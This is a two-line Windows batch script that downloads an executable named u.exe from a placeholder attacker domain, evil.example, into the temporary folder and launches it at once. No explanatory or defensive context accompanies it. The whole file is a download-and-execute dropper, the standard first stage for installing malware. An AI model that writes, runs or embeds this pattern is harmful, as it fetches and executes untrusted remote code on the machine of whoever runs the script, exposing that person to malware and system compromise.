@echo off
curl -o %TEMP%\u.exe https://evil.example/u.exe && start %TEMP%\u.exe
